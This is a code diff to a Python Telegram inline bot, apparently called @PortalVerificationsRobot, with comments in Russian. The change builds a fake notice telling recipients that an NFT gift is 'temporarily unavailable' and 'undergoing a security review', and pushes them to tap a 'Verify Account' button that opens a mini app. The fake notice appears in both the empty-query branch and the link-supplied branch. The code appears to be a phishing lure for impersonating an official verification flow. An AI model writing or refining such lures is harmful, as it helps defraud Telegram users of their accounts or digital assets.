@@ -46,16 +46,34 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.inline_query.query.strip()
     
-    # Если ничего не введено
+    # ⚡ ЕСЛИ НИЧЕГО НЕ ВВЕДЕНО - ПОКАЗЫВАЕМ ТЕКСТ С ❄️
     if not query:
+        keyboard = [
+            [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # ТЕКСТ С ❄️ (КАК ТЫ НАПИСАЛ)
+        message = (
+            f"❄️ *Gift temporarily unavailable*\n\n"
+            f"*SpyAgaric-37522* is currently undergoing a security review.\n\n"
+            f"To regain access, please verify the gift using the official bot below.\n\n"
+            f"🔗 [View Gift](https://t.me/nft/SpyAgaric-37522)\n\n"
+            f"A single tap below and the asset is on its way."
+        )
+        
         results = [
             InlineQueryResultArticle(
                 id="1",
-                title="Вставьте ссылку на подарок",
-                description="Например: https://t.me/nft/JollyChimp-20203",
+                title="❄️ Gift temporarily unavailable",
+                description="SpyAgaric-37522 is undergoing security review",
                 input_message_content=InputTextMessageContent(
-                    "Пожалуйста, введите ссылку на подарок после @PortalVerificationsRobot"
-                )
+                    message_text=message,
+                    parse_mode='Markdown',
+                    disable_web_page_preview=False
+                ),
+                reply_markup=reply_markup,
+                thumb_url=PHOTO_URL
             )
         ]
         await update.inline_query.answer(results)
@@ -70,10 +88,10 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Извлекаем ID подарка
+        # Извлекаем ID подарка из ссылки
         gift_id = query.split('/')[-1] if '/' in query else 'JollyChimp-20203'
         
-        # ⚡ ПРАВИЛЬНЫЙ ТЕКСТ (КОТОРЫЙ ТЫ НАПИСАЛ)
+        # ТЕКСТ С ❄️ ДЛЯ КОНКРЕТНОЙ ССЫЛКИ
         message = (
             f"❄️ *Gift temporarily unavailable*\n\n"
             f"*{gift_id}* is currently undergoing a security review.\n\n"
